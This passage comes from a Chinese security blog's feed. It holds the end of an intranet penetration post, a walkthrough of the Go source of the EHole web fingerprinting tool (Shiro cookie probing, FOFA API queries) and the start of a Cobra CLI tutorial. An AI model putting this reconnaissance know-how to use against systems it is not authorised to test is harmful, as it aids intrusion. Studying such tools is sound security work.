awk">proxychains4 curl -I http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">22.129</span>:<span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230806115827385.png" alt="image-20230806115827385"></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ehole3.1源码学习</title>
    <link href="/2023/08/20/%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/Ehole3.1%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/"/>
    <url>/2023/08/20/%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/Ehole3.1%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="Ehole3-1源码学习"><a href="#Ehole3-1源码学习" class="headerlink" title="Ehole3.1源码学习"></a>Ehole3.1源码学习</h1><p>项目地址：<a href="https://github.com/EdgeSecurityTeam/EHole">https://github.com/EdgeSecurityTeam/EHole</a></p><h2 id="工具思路"><a href="#工具思路" class="headerlink" title="工具思路"></a>工具思路</h2><p>简单来说这个工具有 2 个功能：</p><ol><li>指定资产的指纹识别</li><li>从 FOFA 中提取资产进行指纹识别</li></ol><p>这里画一下单个目标指纹识别的流程图，FOFA 就不画了，比较简单。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308201241004.png" alt="Ehole"></p><h2 id="cmd-x2F-finger-go"><a href="#cmd-x2F-finger-go" class="headerlink" title="cmd&#x2F;finger.go"></a>cmd&#x2F;finger.go</h2><p>这里是使用 cobra 生成的命令，直接看 finger.go 即可：</p><p>这里是先使用 NewScan() 创建了一个 FinScan 实例，然后调用 StartScan() 方法启动扫描：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> urla != <span class="hljs-string">&quot;&quot;</span> &#123;<br>    s := finger.NewScan([]<span class="hljs-type">string</span>&#123;urla&#125;, thread, output, proxy)<br>    s.StartScan()<br>    os.Exit(<span class="hljs-number">1</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="module-x2F-finger-x2F-finger-go"><a href="#module-x2F-finger-x2F-finger-go" class="headerlink" title="module&#x2F;finger&#x2F;finger.go"></a>module&#x2F;finger&#x2F;finger.go</h2><p>这里先看  NewScan() ：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewScan</span><span class="hljs-params">(urls []<span class="hljs-type">string</span>, thread <span class="hljs-type">int</span>, output <span class="hljs-type">string</span>, proxy <span class="hljs-type">string</span>)</span></span> FinScan &#123;<br>s := &amp;FinScan&#123;<br>UrlQueue:    queue.NewQueue(),<span class="hljs-comment">// URL 队列</span><br>Ch:          <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> []<span class="hljs-type">string</span>, thread),<br>Wg:          sync.WaitGroup&#123;&#125;,<br>Thread:      thread,<br>Output:      output,<br>Proxy:       proxy,<br>AllResult:   []Outrestul&#123;&#125;,<br>FocusResult: []Outrestul&#123;&#125;,<br>&#125;<br>err := LoadWebfingerprint(source.GetCurrentAbPathByExecutable() + <span class="hljs-string">&quot;/finger.json&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>color.RGBStyleFromString(<span class="hljs-string">&quot;237,64,35&quot;</span>).Println(<span class="hljs-string">&quot;[error] fingerprint file error!!!&quot;</span>)<br>os.Exit(<span class="hljs-number">1</span>)<br>&#125;<br><span class="hljs-comment">// 获取到指纹</span><br>s.Finpx = GetWebfingerprint()<br><span class="hljs-comment">// 推入队列中</span><br><span class="hljs-keyword">for</span> _, url := <span class="hljs-keyword">range</span> urls &#123;<br>s.UrlQueue.Push([]<span class="hljs-type">string</span>&#123;url, <span class="hljs-string">&quot;0&quot;</span>&#125;)<br>&#125;<br><span class="hljs-keyword">return</span> s<br>&#125;<br></code></pre></td></tr></table></figure><p>source.GetCurrentAbPathByExecutable() 是获取可执行文件的绝对路径：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GetCurrentAbPathByExecutable</span><span class="hljs-params">()</span></span> <span class="hljs-type">string</span> &#123;<br>exePath, err := os.Executable()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(err)<br>&#125;<br>res, _ := filepath.EvalSymlinks(filepath.Dir(exePath))<br><span class="hljs-keyword">return</span> res<br>&#125;<br></code></pre></td></tr></table></figure><p>LoadWebfingerprint() 解析 json 文件内容，获取到了指纹信息：Cms、Method、Location、Keyword：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">LoadWebfingerprint</span><span class="hljs-params">(path <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">error</span> &#123;<br>data, err := ioutil.ReadFile(path)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br><span class="hljs-keyword">var</span> config Packjson<br>err = json.Unmarshal(data, &amp;config)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br>Webfingerprint = &amp;config<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Packjson <span class="hljs-keyword">struct</span> &#123;<br>Fingerprint []Fingerprint<br>&#125;<br><br><span class="hljs-keyword">type</span> Fingerprint <span class="hljs-keyword">struct</span> &#123;<br>Cms      <span class="hljs-type">string</span><br>Method   <span class="hljs-type">string</span><br>Location <span class="hljs-type">string</span><br>Keyword  []<span class="hljs-type">string</span><br>&#125;<br><br><span class="hljs-keyword">var</span> (<br>Webfingerprint Packjson<br>)<br></code></pre></td></tr></table></figure><p>之后就是将 url 都推到队列中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> _, url := <span class="hljs-keyword">range</span> urls &#123;<br>    s.UrlQueue.Push([]<span class="hljs-type">string</span>&#123;url, <span class="hljs-string">&quot;0&quot;</span>&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的队列是自己写的函数，看了一下其实实际的操作就是推入 url、取出进行指纹识别、再推入 js url 、继续进行指纹识别。涉及到了后面去并发指纹识别，线程安全。</p><p>但是感觉管道更加方便一点，而且控制线程的方法可以直接使用管道或者第三方库，更加方便一点。</p><p>继续吧，这里的 “0” 是一个标识，表示其没有进行 js url 爬取。</p><p>来看 StartScan() 函数，这里就开始进行指纹识别了，多个 s.fingerScan() 同时进行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">func (s FinScan) StartScan() &#123;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt;= s.Thread; i++ &#123;<br>s.Wg.Add(<span class="hljs-number">1</span>)<br>go func() &#123;<br>defer s.Wg.Done()<br>s.fingerScan()<br>&#125;()<br>&#125;<br>s.Wg.Wait()<br>color.RGBStyleFromString(<span class="hljs-string">&quot;244,211,49&quot;</span>).Println(<span class="hljs-string">&quot;\n重点资产：&quot;</span>)<br><span class="hljs-keyword">for</span> _, aas := <span class="hljs-built_in">range</span> s.FocusResult &#123;<br>fmt.Printf(fmt.Sprintf(<span class="hljs-string">&quot;[ %s | &quot;</span>, aas.Url))<br>color.RGBStyleFromString(<span class="hljs-string">&quot;237,64,35&quot;</span>).Printf(fmt.Sprintf(<span class="hljs-string">&quot;%s&quot;</span>, aas.Cms))<br>fmt.Printf(fmt.Sprintf(<span class="hljs-string">&quot; | %s | %d | %d | %s ]\n&quot;</span>, aas.Server, aas.Statuscode, aas.Length, aas.Title))<br>&#125;<br><span class="hljs-keyword">if</span> s.Output != <span class="hljs-string">&quot;&quot;</span> &#123;<br>outfile(s.Output, s.AllResult)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>fingerScan()：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s FinScan)</span></span> fingerScan() &#123;<br>    <span class="hljs-comment">// 队列没有空就一直去执行</span><br><span class="hljs-keyword">for</span> s.UrlQueue.Len() != <span class="hljs-number">0</span> &#123;<br>        <span class="hljs-comment">// 从 url数据队列中取出 url数据 =&gt; 这里的数据是 &#123;url,&quot;0&quot;&#125;, 不是单单的 url</span><br>dataface := s.UrlQueue.Pop()<br><span class="hljs-keyword">switch</span> dataface.(<span class="hljs-keyword">type</span>) &#123;<br><span class="hljs-keyword">case</span> []<span class="hljs-type">string</span>:<br>url := dataface.([]<span class="hljs-type">string</span>)<br><span class="hljs-keyword">var</span> data resps<br>            <span class="hljs-comment">// 获取数据</span><br>data, err := httprequest(url, s.Proxy)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>url[<span class="hljs-number">0</span>] = strings.ReplaceAll(url[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;https://&quot;</span>, <span class="hljs-string">&quot;http://&quot;</span>)<br>data, err = httprequest(url, s.Proxy)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">for</span> _, jurl := <span class="hljs-keyword">range</span> data.jsurl &#123;<br><span class="hljs-keyword">if</span> jurl != <span class="hljs-string">&quot;&quot;</span> &#123;<br>s.UrlQueue.Push([]<span class="hljs-type">string</span>&#123;jurl, <span class="hljs-string">&quot;1&quot;</span>&#125;)<br>&#125;<br>&#125;<br>headers := MapToJson(data.header)<br><span class="hljs-keyword">var</span> cms []<span class="hljs-type">string</span><br><span class="hljs-keyword">for</span> _, finp := <span class="hljs-keyword">range</span> s.Finpx.Fingerprint &#123;<br><span class="hljs-keyword">if</span> finp.Location == <span class="hljs-string">&quot;body&quot;</span> &#123;<br><span class="hljs-keyword">if</span> finp.Method == <span class="hljs-string">&quot;keyword&quot;</span> &#123;<br><span class="hljs-keyword">if</span> iskeyword(data.body, finp.Keyword) &#123;<br>cms = <span class="hljs-built_in">append</span>(cms, finp.Cms)<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> finp.Method == <span class="hljs-string">&quot;faviconhash&quot;</span> &#123;<br><span class="hljs-keyword">if</span> data.favhash == finp.Keyword[<span class="hljs-number">0</span>] &#123;<br>cms = <span class="hljs-built_in">append</span>(cms, finp.Cms)<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> finp.Method == <span class="hljs-string">&quot;regular&quot;</span> &#123;<br><span class="hljs-keyword">if</span> isregular(data.body, finp.Keyword) &#123;<br>cms = <span class="hljs-built_in">append</span>(cms, finp.Cms)<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> finp.Location == <span class="hljs-string">&quot;header&quot;</span> &#123;<br><span class="hljs-keyword">if</span> finp.Method == <span class="hljs-string">&quot;keyword&quot;</span> &#123;<br><span class="hljs-keyword">if</span> iskeyword(headers, finp.Keyword) &#123;<br>cms = <span class="hljs-built_in">append</span>(cms, finp.Cms)<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> finp.Method == <span class="hljs-string">&quot;regular&quot;</span> &#123;<br><span class="hljs-keyword">if</span> isregular(headers, finp.Keyword) &#123;<br>cms = <span class="hljs-built_in">append</span>(cms, finp.Cms)<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> finp.Location == <span class="hljs-string">&quot;title&quot;</span> &#123;<br><span class="hljs-keyword">if</span> finp.Method == <span class="hljs-string">&quot;keyword&quot;</span> &#123;<br><span class="hljs-keyword">if</span> iskeyword(data.title, finp.Keyword) &#123;<br>cms = <span class="hljs-built_in">append</span>(cms, finp.Cms)<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> finp.Method == <span class="hljs-string">&quot;regular&quot;</span> &#123;<br><span class="hljs-keyword">if</span> isregular(data.title, finp.Keyword) &#123;<br>cms = <span class="hljs-built_in">append</span>(cms, finp.Cms)<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br>cms = RemoveDuplicatesAndEmpty(cms)<br>cmss := strings.Join(cms, <span class="hljs-string">&quot;,&quot;</span>)<br>out := Outrestul&#123;data.url, cmss, data.server, data.statuscode, data.length, data.title&#125;<br>s.AllResult = <span class="hljs-built_in">append</span>(s.AllResult, out)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(out.Cms) != <span class="hljs-number">0</span> &#123;<br>outstr := fmt.Sprintf(<span class="hljs-string">&quot;[ %s | %s | %s | %d | %d | %s ]&quot;</span>, out.Url, out.Cms, out.Server, out.Statuscode, out.Length, out.Title)<br>color.RGBStyleFromString(<span class="hljs-string">&quot;237,64,35&quot;</span>).Println(outstr)<br>s.FocusResult = <span class="hljs-built_in">append</span>(s.FocusResult, out)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>outstr := fmt.Sprintf(<span class="hljs-string">&quot;[ %s | %s | %s | %d | %d | %s ]&quot;</span>, out.Url, out.Cms, out.Server, out.Statuscode, out.Length, out.Title)<br>fmt.Println(outstr)<br>&#125;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">continue</span><br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>httprequest() 获取 url 数据：</p><p>前面就是设置一下跳过证书验证、代理、超时等，这里是在 cookie 这里加入了 rememberMe 字段，用于去识别 shiro 框架。这个小细节是 TideFinger Python 中没有的。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">httprequest</span><span class="hljs-params">(url1 []<span class="hljs-type">string</span>, proxy <span class="hljs-type">string</span>)</span></span> (resps, <span class="hljs-type">error</span>) &#123;<br>transport := &amp;http.Transport&#123;<br>TLSClientConfig: &amp;tls.Config&#123;InsecureSkipVerify: <span class="hljs-literal">true</span>&#125;,<br>&#125;<br><span class="hljs-keyword">if</span> proxy != <span class="hljs-string">&quot;&quot;</span> &#123;<br>proxys := <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(_ http.Request)</span></span> (url.URL, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">return</span> url.Parse(proxy)<br>&#125;<br>transport = &amp;http.Transport&#123;<br>TLSClientConfig: &amp;tls.Config&#123;InsecureSkipVerify: <span class="hljs-literal">true</span>&#125;,<br>Proxy:           proxys,<br>&#125;<br>&#125;<br>client := &amp;http.Client&#123;<br>Timeout:   <span class="hljs-number">10</span>  time.Second,<br>Transport: transport,<br>&#125;<br>req, err := http.NewRequest(<span class="hljs-string">&quot;GET&quot;</span>, url1[<span class="hljs-number">0</span>], <span class="hljs-literal">nil</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>cookie := &amp;http.Cookie&#123;<br>Name:  <span class="hljs-string">&quot;rememberMe&quot;</span>,<br>Value: <span class="hljs-string">&quot;me&quot;</span>,<br>&#125;<br>req.AddCookie(cookie)<br>req.Header.Set(<span class="hljs-string">&quot;Accept&quot;</span>, <span class="hljs-string">&quot;/;q=0.8&quot;</span>)<br>req.Header.Set(<span class="hljs-string">&quot;Connection&quot;</span>, <span class="hljs-string">&quot;close&quot;</span>)<br>    <span class="hljs-comment">// 随机头</span><br>req.Header.Set(<span class="hljs-string">&quot;User-Agent&quot;</span>, rndua())<br>resp, err := client.Do(req)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">defer</span> resp.Body.Close()<br>result, _ := ioutil.ReadAll(resp.Body)<br>contentType := strings.ToLower(resp.Header.Get(<span class="hljs-string">&quot;Content-Type&quot;</span>))<br>    <span class="hljs-comment">// body utf-8 编码</span><br>httpbody := <span class="hljs-type">string</span>(result)<br>httpbody = toUtf8(httpbody, contentType)<br>    <span class="hljs-comment">// 获取 title</span><br>title := gettitle(httpbody)<br>httpheader := resp.Header<br><span class="hljs-keyword">var</span> server <span class="hljs-type">string</span><br>capital, ok := httpheader[<span class="hljs-string">&quot;Server&quot;</span>]<br><span class="hljs-keyword">if</span> ok &#123;<br>server = capital[<span class="hljs-number">0</span>]<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>Powered, ok := httpheader[<span class="hljs-string">&quot;X-Powered-By&quot;</span>]<br><span class="hljs-keyword">if</span> ok &#123;<br>server = Powered[<span class="hljs-number">0</span>]<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>server = <span class="hljs-string">&quot;None&quot;</span><br>&#125;<br>&#125;<br><span class="hljs-comment">// 信息获取完成</span><br><span class="hljs-keyword">var</span> jsurl []<span class="hljs-type">string</span><br><span class="hljs-keyword">if</span> url1[<span class="hljs-number">1</span>] == <span class="hljs-string">&quot;0&quot;</span> &#123;<br><span class="hljs-comment">// 如果是 0, 就爬取 JS 中的 URL</span><br>jsurl = Jsjump(httpbody, url1[<span class="hljs-number">0</span>])<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>jsurl = []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;&quot;</span>&#125;<br>&#125;<br>    <span class="hljs-comment">// 获取 ico 图标的哈希</span><br>favhash := getfavicon(httpbody, url1[<span class="hljs-number">0</span>])<br>s := resps&#123;url1[<span class="hljs-number">0</span>], httpbody, resp.Header, server, resp.StatusCode, <span class="hljs-built_in">len</span>(httpbody), title, jsurl, favhash&#125;<br><span class="hljs-keyword">return</span> &amp;s, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>到这里指纹识别其实就已经完了，后面的就是根据 body、title、header 信息及 keyword、faviconhash、regular 方法去匹配指纹了，跟 TideFinger 也差不多。</p><h2 id="module-x2F-finger-x2F-source-x2F-fofa-go"><a href="#module-x2F-finger-x2F-source-x2F-fofa-go" class="headerlink" title="module&#x2F;finger&#x2F;source&#x2F;fofa.go"></a>module&#x2F;finger&#x2F;source&#x2F;fofa.go</h2><p>再看下 fofa 这里，这个就是根据  fofa apt 去组合请求信息，然后请求获取响应后解析即可。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">fofa_api</span><span class="hljs-params">(keyword <span class="hljs-type">string</span>, email <span class="hljs-type">string</span>, key <span class="hljs-type">string</span>, page <span class="hljs-type">int</span>, size <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">string</span> &#123;<br>input := []<span class="hljs-type">byte</span>(keyword)<br>encodeString := base64.StdEncoding.EncodeToString(input)<br>api_request := fmt.Sprintf(<span class="hljs-string">&quot;https://fofa.info/api/v1/search/all?email=%s&amp;page=%d&amp;size=%d&amp;key=%s&amp;qbase64=%s&amp;fields=ip,host,title,port,protocol&quot;</span>, strings.Trim(email, <span class="hljs-string">&quot; &quot;</span>), page, size, strings.Trim(key, <span class="hljs-string">&quot; &quot;</span>), encodeString)<br><span class="hljs-keyword">return</span> api_request<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">fofahttp</span><span class="hljs-params">(url <span class="hljs-type">string</span>, timeout <span class="hljs-type">string</span>)</span></span> AutoGenerated &#123;<br><span class="hljs-keyword">var</span> itime, err = strconv.Atoi(timeout)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Println(<span class="hljs-string">&quot;fofa超时参数错误: &quot;</span>, err)<br>&#125;<br>transport := &amp;http.Transport&#123;TLSClientConfig: &amp;tls.Config&#123;InsecureSkipVerify: <span class="hljs-literal">true</span>&#125;&#125;<br>client := &amp;http.Client&#123;<br>Timeout:   time.Duration(itime)  time.Second,<br>Transport: transport,<br>&#125;<br>req, err := http.NewRequest(<span class="hljs-string">&quot;GET&quot;</span>, url, <span class="hljs-literal">nil</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(err)<br>&#125;<br>req.Header.Set(<span class="hljs-string">&quot;Accept&quot;</span>, <span class="hljs-string">&quot;/;q=0.8&quot;</span>)<br>req.Header.Set(<span class="hljs-string">&quot;Connection&quot;</span>, <span class="hljs-string">&quot;close&quot;</span>)<br>req.Header.Set(<span class="hljs-string">&quot;User-Agent&quot;</span>, <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36&quot;</span>)<br>resp, err := client.Do(req)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(err)<br>&#125;<br><span class="hljs-keyword">defer</span> resp.Body.Close()<br>result, _ := ioutil.ReadAll(resp.Body)<br>res := &amp;AutoGenerated&#123;&#125;<br>json.Unmarshal(result, &amp;res)<br><span class="hljs-keyword">return</span> res<br>&#125;<br></code></pre></td></tr></table></figure><p>到这里就完了，Ehole 这里感觉启动指纹识别感觉有些不习惯，用 go 写这个应该可以更简单一下。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>源码学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>源码学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Go Cobra</title>
    <link href="/2023/08/20/%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93/GoCobra/"/>
    <url>/2023/08/20/%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93/GoCobra/</url>
    
    <content type="html"><![CDATA[<h1 id="Go-Cobra"><a href="#Go-Cobra" class="headerlink" title="Go Cobra"></a>Go Cobra</h1><p>Cobra 是一个库，其提供简单的接口来创建强大现代的 CLI 接口，类似于 git 或者 go 工具。同时，它也是一个应用，用来生成个人应用框架，从而开发以 Cobra 为基础的应用。Docker 源码中使用了 Cobra。</p><p>安装 Cobra：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">go</span> <span class="hljs-built_in">get</span> github.<span class="hljs-keyword">com</span>/spf13/cobra/cobra<br></code></pre></td></tr></table></figure><p>安装成功后可在终端执行 cobra-cli  命令查看是否安装成功：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308200937949.png" alt="image-20230820093731804"></p><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">初始化</span><br>cobra-cli init<br><span class="hljs-meta prompt_"># </span><span class="language-bash">使用 viper</span><br>cobra-cli init --viper<br></code></pre></td></tr></table></figure><p><img 